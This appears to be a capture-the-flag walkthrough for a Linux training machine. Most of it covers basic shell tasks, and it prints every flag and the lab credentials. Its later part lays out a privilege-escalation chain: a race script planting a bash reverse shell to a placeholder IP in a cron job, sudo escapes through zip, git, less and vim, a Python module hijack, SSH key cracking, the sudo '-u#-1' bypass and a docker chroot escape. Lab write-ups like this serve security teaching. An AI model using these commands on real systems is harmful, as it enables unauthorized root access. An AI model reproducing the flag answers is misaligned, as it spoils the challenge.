# Linux Agent 

Username: agent47

Password: 640509040147

**Use `su` to switch between different users without logging out**

---

## Table of Contents

* [Task-3](#task-3)
* [Task-4](#task-4)
* [Mission-1](#mission-1)
* [Mission-2](#mission-2)
* [Mission-3](#mission-3)
* [Mission-4](#mission-4)
* [Mission-5](#mission-5)
* [Mission-6](#mission-6)
* [Mission-7](#mission-7)
* [Mission-8](#mission-8)
* [Mission-9](#mission-9)
* [Mission-10](#mission-10)
* [Mission-11](#mission-11)
* [Mission-12](#mission-12)
* [Mission-13](#mission-13)
* [Mission-14](#mission-14)
* [Mission-15](#mission-15)
* [Mission-16](#mission-16)
* [Mission-17](#mission-17)
* [Mission-18](#mission-18)
* [Mission-19](#mission-19)
* [Mission-20](#mission-20)
* [Mission-21](#mission-21)
* [Mission-22](#mission-22)
* [Mission-23](#mission-23)
* [Mission-24](#mission-24)
* [Mission-25](#mission-25)
* [Mission-26](#mission-26)
* [Mission-27](#mission-27)
* [Mission-28](#mission-28)
* [Mission-29](#mission-29)
* [Mission-30](#mission-30)
* [Viktor's flag](#viktor)
* [Task-3](#task-3)
* [Dalia](#dalia)
* [Silvio](#silvio)
* [Reza](#reza)
* [Jordan](#jordan)
* [Ken](#ken)
* [Sean](#sean)
* [Penelope](#penelope)
* [Maya](#maya)
* [Robert's passphrase](#robert)
* [User.txt](#usertxt)
* [Root.txt](#roottxt)

---

## Task-3

### Mission-1

Just check the banner after loging in the machine.

`mission1{174dc8f191bcbb161fe25f8a5b58d1f0}`

### Mission-2

Just check the home dir for mission1

`mission2{8a1b68bb11e4a35245061656b5b9fa0d}`

## Mission-3

Just cat out the flag.txt file in mission2's home dir

`mission3{ab1e1ae5cba688340825103f70b0f976}`

## Mission-4

User vim to open the flag.txt file rather than cat

`mission4{264a7eeb920f80b3ee9665fafb7ff92d}`

## Mission-5

This time it's inside a directory

`mission5{bc67906710c3a376bcc7bd25978f62c0}`

## Mission-6

This time it's a hidden file

`mission6{1fa67e1adc244b5c6ea711f0c9675fde}`

## Mission-7

Hidden Directory

`mission7{53fd6b2bad6e85519c7403267225def5}`

## Mission-8

Once switched using `su` just go to /home/mission7 for the flag.txt

`mission8{3bee25ebda7fe7dc0a9d2f481d10577b}`

## Mission-9

It's in / dir 

`mission9{ba1069363d182e1c114bef7521c898f5}`

## Mission-10

Use : `grep mission10 rockyou.txt`

`mission10{0c9d1c7c5683a1a29b05bb67856524b6}`

## Mission-11

Use: `find . -type f` to locate flag.txt file

`mission11{db074d9b68f06246944b991d433180c0}`

## Mission-12

It's hidden inside environment variables. Use `env` to see all the env set

`mission12{f449a1d33d6edc327354635967f9a720}`

### Mission-13

Just use `chmod +r flag.txt` and then `cat flag.txt`

`mission13{076124e360406b4c98ecefddd13ddb1f}`

### Mission-14

This time it is encoded. Just use `cat flag.txt| base64 -d`

`mission14{d598de95639514b9941507617b9e54d2}`

### Mission-15

Flag is in binary. Use any online binary to ascii converter for getting the flag

`mission15{fc4915d818bfaeff01185c3547f25596}`

### Mission-16

This time its in hex.

`mission16{884417d40033c4c2091b44d7c26a908e}`

### Mission-17

Just make the binary executable and then execute to get the flag

`mission17{49f8d1348a1053e221dfe7ff99f5cbf4}`

### Mission-18

This time its a java program use `javac` to compile and `java` to run the code

`mission18{f09760649986b489cda320ab5f7917e8}`

### Mission-19

This time it is a ruby file.

`mission19{a0bf41f56b3ac622d808f7a4385254b7}`

### Mission-20

This time its C file. User `gcc` to compile and then execute the object file

`mission20{b0482f9e90c8ad2421bf4353cd8eae1c}`

### Mission-21

Python file

`mission21{7de756aabc528b446f6eb38419318f0c}`

### Mission-22

We have ourselves an sh shell just typing `bash` will give the flag

`mission22{24caa74eb0889ed6a2e6984b42d49aaf}`

### Mission-23

Here we have a python interpreter open. Just use the below commands to get the file

```python
import os
cmd="cd ../mission23; ls-al"
os.system(cmd)

cmd="cd ../mission23; cat flag.txt"
os.system(cmd)
``` 

`mission23{3710b9cb185282e3f61d2fd8b1b4ffea}`

### Mission-24

Checking the message.txt says about *host* and *curly*. Just check the /etc/hosts file.. There is an entry for mission24.com. Now use `curl mission24.com | grep mission24` to get the flag

`mission24{dbaeb06591a7fd6230407df3a947b89c}`

### Mission-25

Executing the binary gave the following:

```
Words are not the price for your flag
Give Me money Man!!!
```
Using strings on binary we can see that there is `export init=abc`. Checking the `.viminfo` file we get the following code

```c
        const char* p = getenv("pocket");
|3,0,0,1,1,0,1610305036,"const char* p = getenv(\"pocket\");"
""1     LINE    0
        }
        return 0;
|3,1,1,1,2,0,1610305126,"}","return 0;"
"2      LINE    0
        }
|3,0,2,1,1,0,1610305125,"}"
"3      LINE    0
                printf("Don't tell police about the deal man ;)");
|3,0,3,1,1,0,1610305123,"       printf(\"Don't tell police about the deal man ;)\");"
"4      LINE    0
printf("Here ya go!!!\n");
|3,0,5,1,1,0,1610305122,"       printf(\"Here ya go!!!\\n\");"
"6      LINE    0
        {
|3,0,6,1,1,0,1610305122,"{      "
"7      LINE    0
        if(strncmp(p,"money",5) == 0 )
|3,0,7,1,1,0,1610305121,"if(strncmp(p,\"money\",5) == 0 )"
"8      LINE    0
        return 0;}
|3,0,8,1,1,0,1610305120,"return 0;}"
```
It seems it is getting its value from variable named `pocket` and comparing it to `money`.
Using `export pocket=money` and then executing the binary gives the flag

`mission25{61b93637881c87c71f220033b22a921b}`

### Mission-26

The only commands that seem to work here are `cd` and `pwd`. Trying ls, cat, find results in bash saying not found. Using `/bin/ls` and `/bin/cat` one can easily get the flag

`mission26{cb6ce977c16c57f509e9f8462a120f00}`

### Mission-27

Using `strings flag.jpg | grep mission` gives out the flag

`mission27{444d29b932124a48e7dddc0595788f4d}`

### Mission-28

Doing `gunzip` and then using `strings` with `grep` will give the flag

`mission28{03556f8ca983ef4dc26d2055aef9770f}`

### Mission-29

This is ruby interpreter. Use `exec "/bin/bash"` to get the bash shell. Then just cat the file out.. its in reverse. Using `cat txt.galf | rev` will reveal the flag

`mission29{8192b05d8b12632586e25be74da2fff1}`

### Mission-30

Just use `grep -r mission30` to get the flag

`mission30{d25b4c9fac38411d2fcb4796171bda6e}`

### Viktor

Doing `ls -la` on *Escalator* dir reveals `.git` directory. Just use `git log` to get a flag

`viktor{b52c60124c0f8f85fe647021122b3d9a}`

---

## Task-4

### Dalia

Doing `cat /etc/crontab` we get the following:

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   dalia   sleep 30;/opt/scripts/47.sh
*  *    * * *   root    echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
#
```

Checking `echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d` we get:

```bash
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
```

We have 30 secs to change the contents of `/opt/scripts/47.sh` file so that we can do something with it. Let's check if we can get the reverse shell.

Creating a race.sh for easier work

```bash
#!/bin/bash

file=/opt/scripts/47.sh

echo "#!/bin/bash" > $file
echo "/bin/bash -i >& /dev/tcp/<ip_here>/9999 0>&1" >> $file

echo "/usr/bin/wall file executed" >> $file
echo " " >> $file
```

Due to it being a race condition we just have to run this script repeatedly hence an infinte loop will help here:

```bash
while true; do ./race.sh; done
```

Once reverse shell is acquired just cat flag.txt

`dalia{4a94a7a7bb4a819a63a33979926c77dc}`

**Make sure not to close the rev shell as it is not possible to do su to *dalia* user.**

### Silvio

Using `sudo -l` reveals:

```bash
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
```

Checking payload at [gftobins](https://gtfobins.github.io/gtfobins/zip/) and executing the following

```bash
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

Just do `cd ~; cat flag.txt` to get the flag:

`silvio{657b4d058c03ab9988875bc937f9c2ef}`

Stablizing shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
export SHELL=bash
^Z 
stty raw -echo; fg 
```

### Reza

`sudo -l` reveals:

```bash
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
```

Using [GTFOBINS](https://gtfobins.github.io/gtfobins/git/) for checking payload

```bash
sudo -u reza PAGER='bash -c "exec bash 0<&1"' git -p help
```

`reza{2f1901644eda75306f3142d837b80d3e}`

### Jordan
`sudo -l` reveals:

```bash
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
```

Executing the */opt/scripts/Gun-Shop.py* the following error appears

```bash
sudo -u jordan /opt/scripts/Gun-Shop.py
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
    import shop
ModuleNotFoundError: No module named 'shop'
```

```bash
env_reset    If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the callers environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The default contents of the env_keep and env_check lists are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

setenv    Allow the user to disable the env_reset option from the command line via the -E option. Additionally, environment variables set via the command line are not subject to the restrictions imposed by env_check, env_delete, or env_keep. As such, only trusted users should be allowed to set variables in this manner. This flag is off by default.

```

```python
#!/usr/bin/python3
import os
os.system("/bin/bash")
```

```bash
sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
```

The flag is reversed. Use `rev` to reverse it

`jordan{fcbc4b3c31c9b58289b3946978f9e3c3}`

### Ken

`sudo -l` reveals:

```bash
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
```

Using [GTFOBINS]() for appropriate commands

```bash
sudo -u ken less /etc/profile
!/bin/sh
```

`ken{4115bf456d1aaf012ed4550c418ba99f}`

### Sean

`sudo -l` reveals:

```bash
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
```

Using vim to get the shell of user sean

```bash
sudo -u sean vim /etc/profile
:!/bin/bash
```

No flag at homedir of sean but he is a member of *adm* group. Checking log files.

```bash
grep -r "sean{" /var/log
sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
```

Checking the base64 text.

```bash
echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
The password of penelope is p3nelope
```

### Penelope

Using `su` to change to user penelope from the user viktor. Just `cat` the flag.txt

`penelope{2da1c2e9d2bd0004556ae9e107c1d222}`

### Maya

Checking the home dir for user *Penelope* we have:
```bash
ls -l
-rwsr-sr-x 1 maya     maya     39096 Jan 12  2021 base64
```

Assuming there is a *flag.txt* file inside home dir for maya.

```bash
file=/home/maya/flag.txt; ./base64 $file | base64 -d
```

`maya{a66e159374b98f64f89f7c8d458ebb2b}`

### Robert

Using maya's flag.txt content as her password and checking the message in *elusive_targets.txt* file

```bash
Welcome 47 glad you made this far.
You have made our Agency very proud.

But, we have a last unfinished job which is to infiltrate kronstadt industries.
He has a entrypoint at localhost.

Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
Robert is involved to be illegally hacking into our server's.

He was able to transfer the .ssh folder from robert's home directory.

The old .ssh is kept inside old_robert_ssh directory incase you need it.

Good Luck!!!
    47
```

Copying the *id_rsa* and executing **ssh2john** on it to convert to john readable format. Executing `john` to get the password: `industryweapon`

### user.txt

It's already clear that there is ssh running on localhost. Using `ss -lnpt` to check the port.

```bash
State          Recv-Q          Send-Q                    Local Address:Port                     Peer Address:Port          
LISTEN         0               128                           127.0.0.1:2222                          0.0.0.0:*             
LISTEN         0               128                           127.0.0.1:80                            0.0.0.0:*             
LISTEN         0               128                       127.0.0.53%lo:53                            0.0.0.0:*             
LISTEN         0               128                           127.0.0.1:34517                         0.0.0.0:*             
LISTEN         0               128                             0.0.0.0:22                            0.0.0.0:*             
LISTEN         0               5                             127.0.0.1:631                           0.0.0.0:*             
LISTEN         0               128                                [::]:22                               [::]:*             
LISTEN         0               5                                 [::1]:631                              [::]:*             
```

Using ssh to login to port 2222 with password *industryweapon*

```bash
ssh robert@localhost -i id_rsa.pub -p 2222
```

Once logged in, `sudo -l` reveals:

```bash
Matching Defaults entries for robert on ec96850005d6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash

```

*!root* is a quite eye catchable as there is an [exploit](https://www.exploit-db.com/exploits/47502) that uses this to get root access. Checking the sudo version.

```bash
sudo  -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

This is exploitable. Using the below command for getting root user.  

```bash
sudo -u#-1 /bin/bash
```
The flag is located at */root/user.txt*

### Root.txt

Inside */root* we have a *success.txt* file with following contents

```bash
47 you made it!!!

You have made it, Robert has been taught a lesson not to mess with ICA.
Now, Return to our Agency back with some safe route.
All the previous door's have been closed.

Good Luck Amigo!
```

Maybe a docker escape is what its talking about. After some fiddling around found a docker binary in /tmp directory. Checking the container name.

```bash
./docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
ec96850005d6        mangoman            "/usr/sbin/sshd -D"   9 months ago        Up 2 hours          127.0.0.1:2222->22/tcp   kronstadt_industries
```

Breaking out of docker instance.

```bash
./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
cd /root
cat root.txt
```
